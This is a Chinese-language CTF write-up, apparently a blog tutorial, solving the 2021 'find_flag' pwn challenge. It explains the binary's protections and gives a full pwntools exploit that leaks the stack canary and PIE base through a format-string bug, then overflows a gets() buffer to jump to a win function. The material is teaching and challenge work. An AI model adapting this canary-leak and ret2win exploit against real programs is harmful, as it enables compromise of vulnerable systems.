---
title: Pwn-PIE
description: pwn-PIE学习。
date: 2026-05-17 18:01:55
updated: 2026-05-17 18:01:55
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260123142057_1.jpg
categories: [安全]
tags: [pwn]
recommend: 10
---

### Pwn-PIE



####  [深育杯 2021] find_flag 题解 PIE

题目连接:https://www.nssctf.cn/problem/774

#### 系统保护机制

> 什么是系统保护机制？

现代 Linux 程序默认开启多种保护，增加利用难度：

| 保护       | 作用                                                     | 本题   |
| ---------- | -------------------------------------------------------- | ------ |
| **PIE**    | 程序每次运行的地址都随机化，无法直接预测函数位置         | ✅ 开启 |
| **Canary** | 栈上放一个"哨兵值"，函数返回前检查它有没有被篡改，防溢出 | ✅ 开启 |
| **NX**     | 栈不可执行，不能直接在栈上写 shellcode                   | ✅ 开启 |
| **RELRO**  | GOT 表只读，不能通过改 GOT 劫持函数                      | Full   |

由于 PIE 开启，我们需要先"泄漏"地址才能知道函数在哪；由于 Canary 开启，我们需要泄漏 Canary 才能绕过栈溢出检测。

什么是格式化字符串漏洞？

```c
printf(user_input);   // 漏洞写法
printf("%s", user_input);  // 安全写法
```

如果直接把用户输入当格式串传给 `printf`，攻击者可以用 `%p`、`%n` 等格式符来**读内存**或**写内存**。

常见格式符：

- `%p`：以十六进制打印一个指针值（8 字节）
- `%k$p`：直接打印第 k 个参数（比如 `%6$p` 打印第 6 个参数）
- `%n`：把已输出的字节数写入某个地址（用于任意写，本题不用）

---

> 什么是栈溢出？

程序用 `gets()` 这类不安全函数读入数据时，**不检查输入长度**。如果输入超出缓冲区大小，就会覆盖栈上相邻的数据（Canary、返回地址等）。

什么是 ROP（Return-Oriented Programming）？

当 NX 开启后，不能在栈上直接执行代码。ROP 的思路是：利用程序中已有的指令片段（称为 gadget，比如一个单独的 `ret` 指令），把它们拼起来形成攻击链。

x86-64 函数调用约定

函数参数传递规则：

- 第 1 个参数 → RDI 寄存器
- 第 2 个 → RSI
- 第 3 个 → RDX
- 第 4 个 → RCX
- 第 5 个 → R8
- 第 6 个 → R9
- 第 7 个及以后 → 栈上

对于变参函数（如 `printf`），虽然只传了 1 个实参，但 `printf` 内部会根据 `%p` 的数量**按顺序去读**：第 1 个 `%p` 读 RSI，第 2 个读 RDX，第 5 个读 R9，第 6 个起读栈。

什么是栈对齐（movaps 问题）？

`system()` 函数内部使用了 `movaps` 指令，该指令要求 RSP 寄存器的值必须是 **16 字节对齐**（地址的末位是 0）。如果不对齐，程序会段错误（SIGSEGV）。

解决办法：在跳转到目标函数前，加一个多余的 `ret` gadget，让 RSP 移动 8 字节，从而调整对齐。

---

**0x01 分析程序**

查看保护

```bash
checksec --file=find_flag
```

输出：

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

保护全开，所以我们需要：**泄漏 Canary + 泄漏地址 → 构造 ROP 链 → 获取 shell/flag**。

反汇编分析

用 IDA 或 `objdump -d` 反汇编：

```
objdump -d find_flag | grep -A 100 "1333:"
```

关键函数（地址 0x132f）分析：

```asm
1333: push   rbp
1334: mov    rbp, rsp
1337: sub    rsp, 0x60           ; 分配 0x60 字节栈空间

; 设置 Canary
133b: mov    rax, fs:0x28        ; 从线程局部存储读 Canary
1344: mov    [rbp-0x8], rax      ; 存到 rbp-0x8

; 第一次输入（格式化字符串漏洞）
134a: lea    rdi, "Hi! What's your name? "
1356: call   printf              ; 打印提示
135b: lea    rax, [rbp-0x60]     ; buffer1 = rbp-0x60
1367: call   gets                ; gets(buffer1) —— 第一次读入
136c: lea    rdi, "Nice to meet you, "
1378: call   printf              ; 打印 "Nice to meet you, "
137d~13ab: 计算字符串长度，末尾拼上 "!\n"
13af: lea    rax, [rbp-0x60]
13b3: mov    rdi, rax
13bb: call   printf              ; printf(buffer1) ★ 格式化字符串漏洞！

; 第二次输入（栈溢出）
13c0: lea    rdi, "Anything else? "
13cc: call   printf              ; 打印提示
13d1: lea    rax, [rbp-0x40]     ; buffer2 = rbp-0x40
13dd: call   gets                ; gets(buffer2) —— 第二次读入 ★ 栈溢出！

; Canary 检查
13e3: mov    rax, [rbp-0x8]      ; 取出栈上的 Canary
13e7: xor    rax, fs:0x28        ; 和原始 Canary 比较
13f0: je     13f7                ; 相等则跳过
13f2: call   __stack_chk_fail    ; 不等则报错退出！
13f7: leave                      ; 恢复栈
13f8: ret                        ; 返回
```

---

**辅助函数分析**

win 函数（地址 0x1229）：

```asm
1229: endbr64
122d: push   rbp
122e: mov    rbp, rsp
1231: lea    rdi, "/bin/cat flag.txt"   ; 参数
1238: call   system                     ; system("/bin/cat flag.txt")
123d: nop
123e: pop   rbp
123f: ret
```

这个函数就是我们的目标——跳转到它就能执行 `cat flag.txt` 拿到 flag。

栈布局

```
        buffer1     buffer2       canary    saved RBP   返回地址
        (32B)       (32B)         (8B)      (8B)        (8B)
      |-----------|-------------|---------|-----------|-----------|
rbp→  -0x60       -0x40        -0x8      0x0         +0x8
                               ★                  ★
                           需要泄漏          需要泄漏
```

---

**0x02 攻击思路**

分两步走：

Step 1：泄漏 Canary 和 PIE 基址

利用第一次输入的**格式化字符串漏洞**，用 `%p` 读取栈上的值。

关键推导：

- buffer1 在 `rbp-0x60`
- Canary 在 `rbp-0x08`
- 两者距离：`0x60 - 0x08 = 0x58 = 88 字节 = 11 个 qword`

当 `printf(buffer1)` 被调用时：

- `%1$p`~`%5$p` 读寄存器 RSI~R9
- `%6$p` 读**栈上第 1 个位置 = buffer1 开头**
- `%6+11$p` = **`%17$p` = Canary**

同理，返回地址在 `rbp+0x08`，距 buffer1 共 `0x68 / 8 = 13` 个 qword：

- **`%6+13$p` = `%19$p` = 返回地址**
- 返回地址是 `main+0x146f`，**减去 0x146f 就是 PIE 基址**

有了 PIE 基址，就能计算出 win 函数的真正地址（`基址 + 0x1229`）。

---



Step 2：栈溢出跳转到 win 函数

第二次输入用 `gets(buffer2)`，构造 payload：

```
buffer2 → [  0x38 填充  ][  Canary  ][  假 RBP  ][  ret  ][  win  ]
          rbp-0x40       rbp-0x8    rbp+0x0      rbp+0x8 rbp+0x10
                         ↓           ↓            ↓        ↓
                      原样填回      任意值       ret对齐    win 地址
```

为什么加一个 `ret` 在前面？因为 `system()` 内部有 `movaps` 指令，要求 RSP 16 字节对齐。加一个 `ret` 让 RSP 多移动 8 字节，调整对齐。

---

**0x03 编写 Exploit（逐行讲解）**

首先安装 pwntools（Python 的 PWN 工具库）：

```bash
pip install pwntools
```

然后创建 `exploit.py`：

```python
from pwn import *    # 导入 pwntools 所有功能

## 设置目标架构为 amd64（64位）
context.arch = 'amd64'
## 日志级别设为 info（显示成功/错误信息，少一些干扰）
context.log_level = 'info'

## 加载 ELF 文件，获取符号信息
elf = ELF('./find_flag')

## 连接程序（本地测试用 process，打远程用 remote）
p = process('./find_flag')
## p = remote('node5.anna.nssctf.cn', 28586)  # 远程靶机
```

第 1 步：泄露 Canary 和 PIE 基址

```python
## 等待程序输出 "Hi! What's your name? "，然后发送 payload
p.recvuntil(b"name? ")        # recvuntil = 一直收，直到遇到指定字符串

## %17$p 读第 17 个参数 → Canary
## %19$p 读第 19 个参数 → 返回地址
payload1 = b"%17$p.%19$p"

p.sendline(payload1)           # 发送 payload 并回车

## 程序会打印: "Nice to meet you, 0xCANARY.0xRETADDR!\n"
## 我们收 "Nice to meet you, " 之后的内容
p.recvuntil(b"Nice to meet you, ")
data = p.recvuntil(b"!\n", drop=True)  # 收直到 "!\n"，drop=True 去掉 "!\n"

## data 的内容类似: b"0xabcd1234.0x5678ef00"
## 用 . 分割成两部分
canary_str, ret_str = data.split(b".")

## 把十六进制字符串转成整数
canary = int(canary_str, 16)    # 第 1 个 = Canary
ret_addr = int(ret_str, 16)      # 第 2 个 = 返回地址

## 返回地址 = main+0x146f，所以 PIE 基址 = 返回地址 - 0x146f
pie_base = ret_addr - 0x146f

## 有了基址就能算出 win 函数的真实地址
win_addr = pie_base + 0x1229

## 用于栈对齐的 ret gadget
ret_gadget = pie_base + 0x13f8

## 打印出来看看
log.success(f"Canary: {hex(canary)}")        # 绿色输出
log.success(f"PIE base: {hex(pie_base)}")
log.success(f"Win addr: {hex(win_addr)}")
```

第 2 步：构造栈溢出 payload

```python
## 等待第二个提示
p.recvuntil(b"Anything else? ")

## 构造 payload：
## - 0x38 字节填充（从 buffer2 到 canary）
## - Canary（原样写回，绕过检查）
## - 8 字节假 RBP（任意值）
## - ret gadget（修复栈对齐）
## - win 函数地址
payload2 = b"A" * 0x38          # 填充 56 字节
payload2 += p64(canary)         # Canary（8 字节，小端序）
payload2 += b"B" * 8            # 假 RBP（8 字节）
payload2 += p64(ret_gadget)     # ret gadget（对齐用）
payload2 += p64(win_addr)       # win 函数地址

p.sendline(payload2)            # 发送 payload

## 进入交互模式，拿到 flag
p.interactive()
```

完整脚本

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./find_flag')
p = process('./find_flag')
## p = remote('node5.anna.nssctf.cn', 28586)

## ======== Step 1: Leak ========
p.recvuntil(b"name? ")
p.sendline(b"%17$p.%19$p")

p.recvuntil(b"Nice to meet you, ")
data = p.recvuntil(b"!\n", drop=True)
canary_str, ret_str = data.split(b".")

canary = int(canary_str, 16)
ret_addr = int(ret_str, 16)

pie_base = ret_addr - 0x146f
win_addr = pie_base + 0x1229
ret_gadget = pie_base + 0x13f8

log.success(f"Canary: {hex(canary)}")
log.success(f"PIE base: {hex(pie_base)}")
log.success(f"Win addr: {hex(win_addr)}")

## ======== Step 2: Overflow ========
p.recvuntil(b"Anything else? ")
payload2 = b"A" * 0x38 + p64(canary) + b"B" * 8 + p64(ret_gadget) + p64(win_addr)
p.sendline(payload2)

p.interactive()
```

---

0x04 调试辅助：用 GDB 验证

推荐用 GDB + pwndbg 插件来观察内存。

下断点

```bash
gdb ./find_flag
start                    # 启动程序，停在入口点
b *$rebase(0x13bb)       # 断在 printf(buffer1) 处，$rebase 自动加 PIE 基址
c                        # 继续运行
```

输入测试 payload

程序提示 `name?` 后输入：

```
AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

观察栈

```gdb
stack 40      # 或 telescope $rsp 30
```

输出中能看到：

- `arg[6]: 0x252e702541414141` = `AAAA%p.%`（你的输入在 `%6$p`）
- `arg[17]: 0x????...??00` = Canary（最低字节是 0x00）
- `arg[19]: 0x5555...146f` = 返回地址

验证 Canary

```gdb
p/x 0x????...??00 & 0xff    # 结果应为 0x00，证明是 Canary
```

---

0x05 常见问题

Q：为什么是 `%17$p` 不是别的？

buffer1 在 `rbp-0x60`，Canary 在 `rbp-0x08`。距离 = `0x58` 字节 = 11 个 qword。`%6$p` 读 buffer1 开头，所以 `%6+11$p` = `%17$p`。

Q：为什么要加一个 `ret` 在 win 前面？

`system()` 内部用 `movaps` 要求 RSP 16 字节对齐。不加 ret 时 RSP 可能不对齐，程序崩溃。

Q：为什么不用 `system("/bin/sh")` 而用 `cat flag.txt`？

因为 win 函数里已经写死了 `/bin/cat flag.txt`，我们只能跳过去执行它。题目设计如此。

Q：`p64()` 是什么？

pwntools 的函数，把整数转为 8 字节的**小端序**字节串。x86-64 是小端序（低位字节放低地址）。例如 `p64(0x1234)` → `b"\x34\x12\x00\x00\x00\x00\x00\x00"`。

Q：`recvuntil(drop=True)` 有什么用？

`drop=True` 表示**不包含**匹配的字符串在结果里。`recvuntil(b"!\n", drop=True)` 会收 `!` 之前的所有内容，`!\n` 被丢弃。

```md wrap
PIE教程
```
